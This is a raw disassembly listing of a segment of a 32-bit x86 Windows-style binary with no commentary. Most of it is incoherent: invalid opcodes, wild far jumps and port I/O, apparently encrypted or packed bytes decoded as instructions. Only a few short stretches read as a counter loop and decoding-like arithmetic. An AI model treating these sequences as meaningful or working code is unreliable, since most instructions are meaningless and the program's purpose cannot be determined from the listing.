  40f6d6:	or     DWORD PTR [edi],esp
  40f6d8:	retf   
  40f6d9:	mov    esp,0xdc5e8686
  40f6de:	sub    ebx,ebp
  40f6e0:	clc    
  40f6e1:	push   cs
  40f6e2:	cmp    al,0x2d
  40f6e4:	add    eax,0xca6361de
  40f6e9:	push   edi
  40f6ea:	call   0x3ee032cf
  40f6ef:	add    bh,BYTE PTR [esi+0x3591f9f4]
  40f6f5:	jne    0x40f759
  40f6f7:	loopne 0x40f69e
  40f6f9:	imul   esp,DWORD PTR [esi],0xffffffbc
  40f6fc:	nop
  40f6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6fe:	lea    eax,[ecx]
  40f700:	bnd jns 0x40f760
  40f703:	xor    al,0x2f
  40f705:	je     0x40f69d
  40f707:	lea    edx,[edx-0x2c5a5244]
  40f70d:	pop    ss
  40f70e:	icebp  
  40f70f:	add    al,0x9
  40f711:	or     dh,BYTE PTR [edx]
  40f713:	xor    bl,ah
  40f715:	fs xchg ecx,eax
  40f717:	sbb    DWORD PTR [eax+0x49],edx
  40f71a:	shr    ecx,cl
  40f71c:	repnz out dx,al
  40f71e:	jge    0x40f79e
  40f720:	mov    BYTE PTR [eax],ah
  40f722:	das    
  40f723:	push   eax
  40f724:	push   ds
  40f725:	ds push 0xffffffd4
  40f728:	mov    cl,BYTE PTR [edi]
  40f72a:	popf   
  40f72b:	and    bl,cl
  40f72d:	and    eax,0xbc36c41e
  40f732:	arpl   si,dx
  40f734:	daa    
  40f735:	out    dx,al
  40f736:	push   ecx
  40f737:	jl     0x40f6da
  40f739:	gs mov eax,0xb1ad4d2c
  40f73f:	mov    al,0x6f
  40f741:	cmp    ah,BYTE PTR [ebx-0x5c3e78e5]
  40f747:	and    cl,al
  40f749:	retf   0x99c0
  40f74c:	or     BYTE PTR [edx+0x1d],0xc
  40f750:	xchg   edx,eax
  40f751:	(bad)  
  40f752:	rcr    eax,cl
  40f754:	mov    ecx,0xf329d338
  40f759:	nop
  40f75a:	xchg   edi,eax
  40f75b:	mov    eax,0x74ba8868
  40f760:	add    esp,DWORD PTR [ebp-0x61]
  40f763:	dec    esi
  40f764:	xchg   esi,eax
  40f765:	in     eax,dx
  40f766:	sub    edx,DWORD PTR [ebx-0x44]
  40f769:	lds    esp,FWORD PTR [eax]
  40f76b:	rcl    BYTE PTR [edi],1
  40f76d:	nop
  40f76e:	add    BYTE PTR ds:[edx+0x5e],ah
  40f772:	mov    esp,0x44b135ce
  40f777:	xor    ebp,DWORD PTR [ebp+0x27]
  40f77a:	in     al,dx
  40f77b:	sahf   
  40f77c:	sbb    al,0x36
  40f77e:	push   0xffffff9f
  40f780:	cmp    DWORD PTR [ebx-0x1f],ebx
  40f783:	fisub  DWORD PTR [edx+0xb]
  40f786:	nop
  40f787:	mov    cl,0xa2
  40f789:	xor    BYTE PTR [esi-0x52f4161e],cl
  40f78f:	call   0xabc7:0xa06c285e
  40f796:	out    0x95,al
  40f798:	addr16 jo 0x40f724
  40f79b:	test   DWORD PTR [ebp-0x2c],0x81b34fa4
  40f7a2:	fnsave [edx-0x7a406fe0]
  40f7a8:	adc    al,0xf8
  40f7aa:	push   ecx
  40f7ab:	sbb    al,0xc5
  40f7ad:	outs   dx,BYTE PTR ds:[esi]
  40f7ae:	enter  0x30f5,0xb6
  40f7b2:	pop    eax
  40f7b3:	mov    dl,0x4a
  40f7b5:	ins    DWORD PTR es:[edi],dx
  40f7b6:	and    BYTE PTR [edi+eax*2],cl
  40f7b9:	pop    ss
  40f7ba:	xchg   edi,eax
  40f7bb:	cmc    
  40f7bc:	push   ebx
  40f7bd:	neg    DWORD PTR [edx+ebp*8+0x3e]
  40f7c1:	mov    ch,0xf3
  40f7c3:	(bad)  
  40f7c4:	fdivr  st,st(0)
  40f7c6:	ja     0x40f776
  40f7c8:	mov    dl,0x9d
  40f7ca:	sbb    DWORD PTR [eax+0x69482c06],ebp
  40f7d0:	add    al,0x22
  40f7d2:	push   edi
  40f7d3:	lock xchg esp,eax
  40f7d5:	(bad)  
  40f7d6:	push   ss
  40f7d7:	sbb    eax,0x528d28c
  40f7dc:	push   DWORD PTR [esp+eiz*8+0x30]
  40f7e0:	lahf   
  40f7e1:	xor    bh,BYTE PTR [esi-0x1cf9266f]
  40f7e7:	xchg   ebx,eax
  40f7e8:	add    edx,ecx
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x67fe3d5f,ch
  40f80a:	into   
  40f80b:	and    BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f7cd
  40f814:	xchg   edi,eax
  40f815:	int    0x3
  40f817:	js     0x40f7a3
  40f819:	gs es inc ebp
  40f81c:	inc    edx
  40f81d:	adc    eax,0xd67736d8
  40f822:	repnz inc ebx
  40f824:	cmp    cl,BYTE PTR [ebx+0x3dedc2b8]
  40f82a:	mov    ds:0x6f7a2812,eax
  40f82f:	sub    al,0x33
  40f831:	sub    ax,0xfe4f
  40f835:	push   0x4b
  40f837:	ficomp WORD PTR [edi]
  40f839:	sub    esi,DWORD PTR [ebp-0x48]
  40f83c:	popa   
  40f83d:	aam    0x2d
  40f83f:	inc    eax
  40f840:	test   al,0x96
  40f842:	fcomi  st,st(1)
  40f844:	bound  edi,QWORD PTR [ebx+esi*8-0x25]
  40f848:	xor    cl,BYTE PTR [esi+0x37]
  40f84b:	shl    esi,1
  40f84d:	out    dx,al
  40f84e:	sbb    al,0x6b
  40f850:	push   edx
  40f851:	dec    ebx
  40f852:	sti    
  40f853:	pop    ebp
  40f854:	shr    BYTE PTR ds:0xff4c6895,cl
  40f85a:	pop    ebx
  40f85b:	call   0x9ae6:0xd78dc3da
  40f862:	rol    DWORD PTR [edx],1
  40f864:	stos   DWORD PTR es:[edi],eax
  40f865:	nop
  40f866:	inc    ecx
  40f867:	and    DWORD PTR [esi+0x5167ec7d],esp
  40f86d:	je     0x40f853
  40f86f:	stos   DWORD PTR es:[edi],eax
  40f870:	test   al,0xb2
  40f872:	(bad)  
  40f873:	mov    ah,0xf8
  40f875:	lock loope 0x40f819
  40f878:	retf   0x9986
  40f87b:	cli    
  40f87c:	sahf   
  40f87d:	lock sub ecx,0x325572d
  40f884:	push   edi
  40f885:	xchg   edi,eax
  40f886:	ss (bad) 
  40f888:	sar    BYTE PTR [edx+0x6],cl
  40f88b:	mov    ch,BYTE PTR [edi+0x58]
  40f88e:	repz jae 0x40f8a7
  40f891:	inc    ebp
  40f892:	xchg   ecx,eax
  40f893:	rol    edi,1
  40f895:	inc    ecx
  40f896:	push   0x1b04f87f
  40f89b:	aaa    
  40f89c:	fnstsw WORD PTR [esi+0x7af30fec]
  40f8a2:	mov    dl,0xb8
  40f8a4:	mov    eax,ds:0xa7ca9827
  40f8a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8aa:	and    BYTE PTR [ebp-0x71],bl
  40f8ad:	sahf   
  40f8ae:	test   BYTE PTR [esi+0xf0aec63],cl
  40f8b4:	add    eax,0xe1c878b7
  40f8b9:	pop    esi
  40f8ba:	(bad)  
  40f8bb:	retf   0x45b2
  40f8be:	ret    0x7fd2
  40f8c1:	pop    ss
  40f8c2:	adc    al,0xeb
  40f8c4:	dec    esp
  40f8c5:	ficomp WORD PTR [esi-0x36]
  40f8c8:	mov    dl,0x7b
  40f8ca:	push   0x8f6dc16
  40f8cf:	push   esi
  40f8d0:	mov    edx,0x8d54f74
  40f8d5:	jmp    0x757d77c0
  40f8da:	daa    
  40f8db:	out    0xb7,al
  40f8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8de:	mov    dh,0x5b
  40f8e0:	call   0x40f9:0xb6b13495
  40f8e7:	fs dec esi
  40f8e9:	inc    eax
  40f8ea:	enter  0xd2ce,0x1e
  40f8ee:	adc    al,0x90
  40f8f0:	push   ebp
  40f8f1:	cmp    ebp,DWORD PTR [ecx]
  40f8f3:	mov    DWORD PTR [ebp-0x66],esi
  40f8f6:	cmp    bl,BYTE PTR [esi]
  40f8f8:	test   eax,0x90de497f
  40f8fd:	pusha  
  40f8fe:	inc    ecx
  40f8ff:	mov    ecx,0x427ee439
  40f904:	inc    edx
  40f905:	sti    
  40f906:	xlat   BYTE PTR ds:[ebx]
  40f907:	je     0x40f8c5
  40f909:	iret   
  40f90a:	ins    DWORD PTR es:[edi],dx
  40f90b:	mov    eax,0xd823791d
  40f910:	pop    esp
  40f911:	add    ch,0x41
  40f914:	adc    eax,0x10768b5b
  40f919:	mov    esi,0xfd7c5ddd
  40f91e:	frstor [edi-0x3bb56474]
  40f924:	in     eax,0xd0
  40f926:	adc    eax,0x67a95091
  40f92b:	imul   esi,esp,0x3daab4da
  40f931:	sub    ebp,ecx
  40f933:	sub    bl,bl
  40f935:	push   cs
  40f936:	cmp    eax,0x550664b3
  40f93b:	pop    edi
  40f93c:	(bad)  
  40f93d:	(bad)  
  40f93e:	and    esi,DWORD PTR [ecx-0x1a272ec3]
  40f944:	jnp    0x40f8f3
  40f946:	aam    0xe4
  40f948:	jge    0x40f9c1
  40f94a:	pop    esp
  40f94b:	imul   esp,DWORD PTR [edx],0xd6edadeb
  40f951:	rcr    edx,1
  40f953:	fwait
  40f954:	xchg   BYTE PTR [ebp+0x68dcbde3],ah
  40f95a:	jmp    0xe501a01a
  40f95f:	cmp    BYTE PTR [edi+esi*4-0x7a],ch
  40f963:	imul   ebx,DWORD PTR [edi],0xe8f93d59
  40f969:	daa    
  40f96a:	cdq    
  40f96b:	jecxz  0x40f903
  40f96d:	jmp    0xfb8a3e0c
  40f972:	adc    BYTE PTR [ebx],ch
  40f974:	and    BYTE PTR [ecx-0x57],dl
  40f977:	mov    ebx,0xaebd8b8
  40f97c:	xlat   BYTE PTR ds:[ebx]
  40f97d:	bnd call 0x161c809c
  40f983:	pop    ds
  40f984:	push   esi
  40f985:	xor    edi,DWORD PTR [edx-0x14138e30]
  40f98b:	je     0x40f9d8
  40f98d:	dec    esi
  40f98e:	repz push es
  40f990:	sub    BYTE PTR [edi+0x4b372a4e],bh
  40f996:	fstp   DWORD PTR [ecx-0x1dc8754a]
  40f99c:	mov    ds:0xbec004b3,eax
  40f9a1:	xchg   esi,eax
  40f9a2:	or     DWORD PTR [edx],eax
  40f9a4:	mov    ds:0x52665dee,eax
  40f9a9:	and    ax,0x2f2e
  40f9ad:	cs stos DWORD PTR es:[edi],eax
  40f9af:	daa    
  40f9b0:	dec    edx
  40f9b1:	jg     0x40f9ab
  40f9b3:	retf   
  40f9b4:	adc    ch,BYTE PTR ds:0x3e3f384e
  40f9ba:	jo     0x40f9bc
  40f9bc:	cmp    eax,0xd721c13d
  40f9c1:	lods   eax,DWORD PTR ds:[esi]
  40f9c2:	mov    dh,0x2d
  40f9c4:	and    dh,BYTE PTR [esi+0x4122272b]
  40f9ca:	mov    eax,esp
  40f9cc:	cmp    BYTE PTR [esi-0x490942bd],ch
  40f9d2:	cwde   
  40f9d3:	inc    edx
  40f9d4:	int    0x27
  40f9d6:	imul   esi,DWORD PTR [edx],0x31
  40f9d9:	xchg   edi,eax
  40f9da:	lods   eax,DWORD PTR ds:[esi]
  40f9db:	outs   dx,BYTE PTR ds:[esi]
  40f9dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9dd:	pushf  
  40f9de:	inc    esp
  40f9df:	outs   dx,BYTE PTR ds:[esi]
  40f9e0:	push   ebp
  40f9e1:	xor    ecx,DWORD PTR [edx+edi*8]
  40f9e4:	jmp    0x6f8ae2fd
  40f9e9:	sub    BYTE PTR [esi],bh
  40f9eb:	mov    bl,0x89
  40f9ed:	arpl   WORD PTR [edx],cx
  40f9ef:	lahf   
  40f9f0:	or     al,0xd5
  40f9f2:	sbb    bh,0x14
  40f9f5:	inc    ebp
  40f9f6:	adc    ebx,ebp
  40f9f8:	pop    esp
  40f9f9:	out    dx,eax
  40f9fa:	xor    BYTE PTR [ebp+0x1],dl
  40f9fd:	mov    eax,0xfb1e2247
  40fa02:	adc    BYTE PTR cs:[ebp-0x3b95c197],0xa5
  40fa0a:	mov    cl,dh
  40fa0c:	inc    ebp
  40fa0d:	inc    edi
  40fa0e:	cmp    bl,cl
  40fa10:	adc    eax,0xbd1de3dd
  40fa15:	test   BYTE PTR [esi-0x5cc4df19],ah
  40fa1b:	pop    es
  40fa1c:	pop    ebx
  40fa1d:	xchg   esi,eax
  40fa1e:	(bad)  
  40fa1f:	xor    BYTE PTR [ebp+ecx*4+0x61],al
  40fa23:	rcl    DWORD PTR [eax-0x1d],cl
  40fa26:	jae    0x40fa23
  40fa28:	mov    ds:0x17fbac75,al
  40fa2d:	aas    
  40fa2e:	nop
  40fa2f:	or     dl,al
  40fa31:	sub    al,0x95
  40fa33:	fs and cl,cl
  40fa36:	push   cs
  40fa37:	dec    esp
  40fa38:	mov    ah,0xd5
  40fa3a:	dec    esi
  40fa3b:	int    0xed
  40fa3d:	out    0xcb,al
  40fa3f:	sbb    DWORD PTR [ecx-0x21f7f2a5],ebp
  40fa45:	bound  eax,QWORD PTR [ecx+eax*8]
  40fa48:	lods   al,BYTE PTR ds:[esi]
  40fa49:	inc    eax
  40fa4a:	frstor [eax+0x43ec722f]
  40fa50:	sbb    ch,cl
  40fa52:	sub    al,0xab
  40fa54:	mov    esp,DWORD PTR [eax-0x4a]
  40fa57:	sti    
  40fa58:	mov    eax,0x1cd9bc73
  40fa5d:	cli    
  40fa5e:	repz test DWORD PTR [ecx+0x4616aa3b],0x1985d291
  40fa69:	shl    bh,cl
  40fa6b:	mov    ds:0x1bc9de80,al
  40fa70:	pushf  
  40fa71:	mov    WORD PTR [edi+ecx*4-0x4a],gs
  40fa75:	or     cl,BYTE PTR ds:0xe1859141
  40fa7b:	inc    esi
  40fa7c:	nop
  40fa7d:	and    eax,0x53ab840f
  40fa82:	add    BYTE PTR [eax],al
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb75
  40fb0f:	jl     0x40fb54
  40fb11:	retf   
  40fb12:	lea    eax,[ebp+0x78]
  40fb15:	js     0x40fafc
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40fac4
  40fb1b:	repnz rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb1e:	pop    eax
  40fb1f:	pop    ecx
  40fb20:	mov    WORD PTR [ebx+0x4f],es
  40fb23:	out    0x61,al
  40fb25:	push   edx
  40fb26:	std    
  40fb27:	inc    esi
  40fb28:	call   0x97e5:0x4f914bb7
  40fb2f:	sbb    dh,BYTE PTR [edi]
  40fb31:	jl     0x40fad7
  40fb33:	and    BYTE PTR [esi*1-0x6c8f5d3a],cl
  40fb3a:	lods   al,BYTE PTR ds:[esi]
  40fb3b:	dec    ebp
  40fb3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb3d:	mov    ch,bh
  40fb3f:	loope  0x40fb67
  40fb41:	push   ebp
  40fb42:	cwde   
  40fb43:	pop    edx
  40fb44:	mov    ebp,DWORD PTR [esi-0x3b]
  40fb47:	fsubr  QWORD PTR [esp+esi*2-0x44512f02]
  40fb4e:	out    dx,eax
  40fb4f:	push   ds
  40fb50:	mov    edx,0xb6a7c57b
  40fb55:	(bad)  
  40fb56:	fnstsw WORD PTR [ebp+0x2aaf3de0]
  40fb5c:	and    eax,0xf311e8ef
  40fb61:	add    ebp,DWORD PTR [edi-0x24]
  40fb64:	or     eax,ebp
  40fb66:	dec    ebx
  40fb67:	jl     0x40fb48
  40fb69:	push   eax
  40fb6a:	sti    
  40fb6b:	xor    bl,0x3f
  40fb6e:	std    
  40fb6f:	dec    ecx
  40fb70:	xor    BYTE PTR [esi+0x30cdbdf],0x8d
  40fb77:	inc    ebx
  40fb78:	inc    esi
  40fb79:	dec    edx
  40fb7a:	add    DWORD PTR ds:0xeffaa11b,edx
  40fb80:	loopne 0x40fbe5
  40fb82:	gs push edi
  40fb84:	sub    DWORD PTR [esi+0x29],edi
  40fb87:	scas   al,BYTE PTR es:[edi]
  40fb88:	or     DWORD PTR [ebp+0x51a7eaed],edi
  40fb8e:	push   eax
  40fb8f:	gs es dec esi
  40fb92:	mov    DWORD PTR [esi],0x40d5d791
  40fb98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb99:	dec    eax
  40fb9a:	jb     0x40fb9f
  40fb9c:	inc    esi
  40fb9d:	mov    dh,0x87
  40fb9f:	sub    esp,DWORD PTR [edi]
  40fba1:	fst    QWORD PTR [edi+eax*1-0x23]
  40fba5:	ss fmul DWORD PTR es:[esi]
  40fba9:	nop
  40fbaa:	push   ebx
  40fbab:	gs inc ebx
  40fbad:	gs into 
  40fbaf:	imul   ebp,DWORD PTR [ebx-0x169edc1f],0x32daaf8b
  40fbb9:	in     al,0xea
  40fbbb:	dec    ebp
  40fbbc:	fisubr DWORD PTR [edx]
  40fbbe:	sub    cl,cl
  40fbc0:	add    eax,DWORD PTR [si-0xe]
  40fbc4:	dec    esi
  40fbc5:	es mov eax,0x23194b8b
  40fbcb:	jae    0x40fb50
  40fbcd:	and    BYTE PTR [esi-0x7189c04d],dl
  40fbd3:	aam    0x18
  40fbd5:	iret   
  40fbd6:	mov    ebx,0xd67f00aa
  40fbdb:	(bad)  
  40fbdc:	out    dx,al
  40fbdd:	out    dx,al
  40fbde:	inc    ecx
  40fbdf:	shl    ch,cl
  40fbe1:	jbe    0x40fc41
  40fbe3:	(bad)  
  40fbe4:	fsubr  QWORD PTR [ebx]
  40fbe6:	cld    
  40fbe7:	mov    edi,0x40745258
  40fbec:	retf   0xafe3
  40fbef:	jne    0x40fbec
  40fbf1:	rol    DWORD PTR [ecx],1
  40fbf3:	es jo  0x40fbc2
  40fbf6:	jno    0x40fc6a
  40fbf8:	lock aaa 
  40fbfa:	pop    esi
  40fbfb:	(bad)  
  40fbfc:	fs push esp
  40fbfe:	in     eax,dx
  40fbff:	sbb    eax,DWORD PTR ds:0x7e4e5d36
  40fc05:	stos   BYTE PTR es:[edi],al
  40fc06:	mov    edi,0x4ada0625
  40fc0b:	data16 fsub QWORD PTR [ebp+ebx*4-0x5b55549a]
  40fc13:	jno    0x40fb9f
  40fc15:	lods   al,BYTE PTR ds:[esi]
  40fc16:	ret    
  40fc17:	mov    edi,0x9388e7eb
  40fc1c:	adc    cl,ch
  40fc1e:	cmp    ebp,ecx
  40fc20:	mov    ah,0x61
  40fc22:	lock sbb bh,BYTE PTR [ecx-0x297c824]
  40fc29:	mov    edi,0x3b815843
  40fc2e:	and    al,0xc5
  40fc30:	sti    
  40fc31:	fwait
  40fc32:	pop    ss
  40fc33:	into   
  40fc34:	ret    
  40fc35:	(bad)  
  40fc36:	pop    ds
  40fc37:	xchg   BYTE PTR [eax+0x20],ah
  40fc3a:	repz pop ecx
  40fc3c:	xor    BYTE PTR [ecx],ch
  40fc3e:	cmp    BYTE PTR [ebx+0x2d],bh
  40fc41:	sub    DWORD PTR [edx+0x5a0664d7],0xb5db38a7
  40fc4b:	call   0x5fa8:0x819e06fd
  40fc52:	sub    DWORD PTR ds:0x53a0cd70,0xeae1265
  40fc5c:	lods   al,BYTE PTR ds:[esi]
  40fc5d:	ret    
  40fc5e:	sub    DWORD PTR ds:0xefe60e66,ebp
  40fc64:	and    al,0xff
  40fc66:	mov    DWORD PTR [edi-0x45],esi
  40fc69:	fs call 0x8135:0xd44f7026
  40fc71:	scas   al,BYTE PTR es:[edi]
  40fc72:	add    al,0x4e
  40fc74:	fst    DWORD PTR [eax]
  40fc76:	inc    eax
  40fc77:	aad    0xb
  40fc79:	stc    
  40fc7a:	outs   dx,BYTE PTR ds:[esi]
  40fc7b:	xchg   esi,eax
  40fc7c:	xchg   dh,bh
  40fc7e:	inc    eax
  40fc7f:	bound  ecx,QWORD PTR [ecx+0x126b2d29]
  40fc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc86:	lods   al,BYTE PTR ds:[esi]
  40fc87:	xchg   ecx,eax
  40fc88:	sbb    BYTE PTR [eax+0x7eaaa3c3],0xcf
  40fc8f:	pop    es
  40fc90:	add    esi,DWORD PTR [ebx-0x29ed6727]
  40fc96:	mov    ebp,0x5f99201e
  40fc9b:	xchg   ebp,eax
  40fc9c:	fs pop esi
  40fc9e:	fmul   QWORD PTR [edx+eiz*8-0x15]
  40fca2:	pop    es
  40fca3:	dec    ebx
  40fca4:	jmp    0xe023:0x1e72
  40fcaa:	sub    DWORD PTR [esi-0x15],esi
  40fcad:	fbstp  TBYTE PTR [ebx-0x6ce7c9a2]
  40fcb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb4:	or     BYTE PTR [edi],0x50
  40fcb7:	ja     0x40fc50
  40fcb9:	xchg   ah,dl
  40fcbb:	push   ds
  40fcbc:	enter  0x972d,0x60
  40fcc0:	push   0xd46a1750
  40fcc5:	or     eax,0xa2bae914
  40fcca:	add    ecx,DWORD PTR [ecx+0x34fee642]
  40fcd0:	stos   BYTE PTR es:[edi],al
  40fcd1:	cdq    
  40fcd2:	pop    ebx
  40fcd3:	xchg   ebx,eax
  40fcd4:	jle    0x40fd26
  40fcd6:	neg    BYTE PTR [ebp-0x4b]
  40fcd9:	mov    ecx,0x21b3d100
  40fcde:	aaa    
  40fcdf:	rol    DWORD PTR [edi+eiz*4+0x54],0x91
  40fce4:	mov    al,0xda
  40fce6:	xor    bl,al
  40fce8:	mov    esi,0xd9a3c731
  40fced:	lods   al,BYTE PTR ds:[esi]
  40fcee:	jp     0x40fcd9
  40fcf0:	mov    dl,0xae
  40fcf2:	in     al,0xaf
  40fcf4:	stc    
  40fcf5:	hlt    
  40fcf6:	mov    BYTE PTR [ebx],bl
  40fcf8:	popa   
  40fcf9:	in     eax,0x8b
  40fcfb:	into   
  40fcfc:	fisttp QWORD PTR [eax-0x61]
  40fcff:	jle    0x40fc99
  40fd01:	push   esp
  40fd02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd03:	or     al,0xb4
  40fd05:	inc    ebx
  40fd06:	pop    ebp
  40fd07:	in     eax,dx
  40fd08:	daa    
  40fd09:	das    
  40fd0a:	mov    ah,BYTE PTR [ebx]
  40fd0c:	sbb    BYTE PTR [esi+0x27236e5a],0x6f
  40fd13:	cld    
  40fd14:	jg     0x40fd94
  40fd16:	push   ebx
  40fd17:	stos   BYTE PTR es:[edi],al
  40fd18:	cdq    
  40fd19:	popf   
  40fd1a:	and    ecx,DWORD PTR [ecx+0x26]
  40fd1d:	js     0x40fcd6
  40fd1f:	mov    ds:0xacc97be1,al
  40fd24:	jge    0x40fcaa
  40fd26:	push   edi
  40fd27:	retf   0x8419
  40fd2a:	mov    gs,WORD PTR [esi-0x6c1bb0aa]
  40fd30:	stos   DWORD PTR es:[edi],eax
  40fd31:	es push 0xffffffaa
  40fd34:	mov    ebx,0x46df0e21
  40fd39:	push   ebp
  40fd3a:	sub    ebp,ebx
  40fd3c:	mov    ah,al
  40fd3e:	pop    eax
  40fd3f:	adc    DWORD PTR [edx],ebp
  40fd41:	mov    ecx,0x2907abc9
  40fd46:	mov    ?,WORD PTR [edi+0x75b987a8]
  40fd4c:	cmp    eax,0xa502853
  40fd51:	js     0x40fcdc
  40fd53:	in     eax,0x3e
  40fd55:	xor    BYTE PTR [edx+esi*1-0x6007eaf6],dh
  40fd5c:	sub    dh,BYTE PTR [eax+0x58bd073b]
  40fd62:	mov    edx,0xdb61e6db
  40fd67:	fild   DWORD PTR [ecx+eiz*2-0x15688b47]
  40fd6f:	out    dx,al
  40fd70:	sti    
  40fd71:	mov    al,ds:0x70b3f574
  40fd76:	dec    ebx
  40fd77:	std    
  40fd78:	ja     0x40fd98
  40fd7a:	xchg   edi,ebp
  40fd7c:	inc    ebp
  40fd7d:	ret    0xa634
  40fd80:	adc    ebx,DWORD PTR [edx+ebx*2-0x5d46094]
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	jmp    0x7b22b3bd
  40fdc0:	dec    ebx
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	mov    ch,0x78
  40fdc9:	call   0x1b1e7339
  40fdce:	xlat   BYTE PTR ds:[ebx]
  40fdcf:	fidivr DWORD PTR [eax+0x3fe3d702]
  40fdd5:	jnp    0x40fdcc
  40fdd7:	das    
  40fdd8:	jmp    0x86100b46
  40fddd:	mov    eax,ds:0xe6cba5ca
  40fde2:	push   ebx
  40fde3:	and    cl,BYTE PTR [ebx]
  40fde5:	ds repnz das 
  40fde8:	mov    edi,0x9bd63f7e
  40fded:	sahf   
  40fdee:	rol    DWORD PTR [edx],1
  40fdf0:	inc    edi
  40fdf1:	(bad)  
  40fdf3:	out    0x66,al
  40fdf5:	in     eax,0xed
  40fdf7:	xchg   DWORD PTR [eax-0x6954a4e],eax
  40fdfd:	pop    ss
  40fdfe:	iret   
  40fdff:	and    BYTE PTR [eax-0x5165c168],al
  40fe05:	imul   ebx,DWORD PTR [ebx-0x50046d05],0xc5876afb
  40fe0f:	lds    ebp,FWORD PTR [esi]
  40fe11:	dec    edi
  40fe12:	xor    al,0x7d
  40fe14:	aaa    
  40fe15:	inc    eax
  40fe16:	push   ss
  40fe17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe18:	push   0xb7ef52c0
  40fe1d:	xchg   DWORD PTR [edi-0x1b],ecx
  40fe20:	rol    dh,0xc
  40fe23:	aad    0xf2
  40fe25:	rcr    dl,0x19
  40fe28:	fwait
  40fe29:	mov    dh,0xf
  40fe2b:	sub    eax,0xf0696ed1
  40fe30:	bound  ecx,QWORD PTR [ebx]
  40fe32:	jecxz  0x40fea3
  40fe34:	and    DWORD PTR [eax-0x23],edi
  40fe37:	into   
  40fe38:	mov    al,0x7
  40fe3a:	mov    edi,ebp
  40fe3c:	ja     0x40fe4d
  40fe3e:	out    0x30,eax
  40fe40:	pop    ecx
  40fe41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe42:	push   ds
  40fe43:	xchg   edx,eax
  40fe44:	dec    esi
  40fe45:	mov    ah,0x2f
  40fe47:	mov    eax,0x7d19ccb5
  40fe4c:	(bad)  
  40fe4d:	pop    ds
  40fe4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe4f:	mov    eax,ds:0x3d534cc0
  40fe54:	xchg   esi,eax
  40fe55:	test   eax,0x9b2464fa
  40fe5a:	jnp    0x40feae
  40fe5c:	push   ebp
  40fe5d:	inc    esp
  40fe5e:	ss scas al,BYTE PTR es:[edi]
  40fe60:	xchg   ecx,eax
  40fe61:	push   esi
  40fe62:	sbb    DWORD PTR [ebx-0x784e72f2],ebp
  40fe68:	aaa    
  40fe69:	push   edi
  40fe6a:	dec    edx
  40fe6b:	cli    
  40fe6c:	jae    0x40fecf
  40fe6e:	dec    edx
  40fe6f:	mov    edx,0x434c1f1b
  40fe74:	test   al,0x87
  40fe77:	cmc    
  40fe78:	enter  0x2928,0xba
  40fe7c:	jae    0x40fec0
  40fe7e:	cmp    BYTE PTR [edx+0x7ebf047f],ah
  40fe84:	idiv   dh
  40fe86:	adc    DWORD PTR [eax],eax
  40fe88:	sub    al,0x9a
  40fe8a:	cld    
  40fe8b:	aas    
  40fe8c:	pop    ds
  40fe8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe8e:	pop    es
  40fe8f:	jb     0x40fe17
  40fe91:	mov    eax,ds:0x5c422452
